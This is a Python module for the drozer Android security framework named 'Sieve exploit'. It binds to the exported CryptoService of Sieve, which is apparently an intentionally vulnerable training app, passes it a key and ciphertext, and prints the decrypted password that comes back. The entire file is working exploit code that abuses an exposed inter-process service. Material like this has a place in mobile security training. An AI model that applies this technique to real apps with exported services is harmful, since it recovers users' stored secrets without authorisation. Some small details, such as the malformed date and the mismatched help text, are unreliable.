import base64

from drozer import android
from drozer.modules import common, Module

class Decrypt(Module, common.ServiceBinding):

	name = "Sieve exploit"
	description = "="
	examples = ""
	author = "BAM"
	date = "2020-28-03"
	license = "BSD"
	path = ["exploit", "sieve", "crypto"]
	permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

	def add_arguments(self, parser):
		parser.add_argument("key", help="AES KEY")
		parser.add_argument("base64_ciphertext", help="the base64 ciphertext string to be encrypted")

	def execute(self, arguments):
		bundle = self.new("android.os.Bundle")
		bundle.putString("com.mwr.example.sieve.KEY", arguments.key)
		bundle.putByteArray("com.mwr.example.sieve.PASSWORD", self.arg(base64.b64decode(arguments.base64_ciphertext), obj_type="data"))

		binding = self.getBinding("com.mwr.example.sieve", "com.mwr.example.sieve.CryptoService")
		binding.setBundle(bundle)
		binding.setObjFormat("bundleAsObj")

		msg = (13476, 1, 1)
		if (binding.send_message(msg, 5000)):
			self.stdout.write("%s" % binding.getData())
		else:
			self.stderr.write("Error occurred")

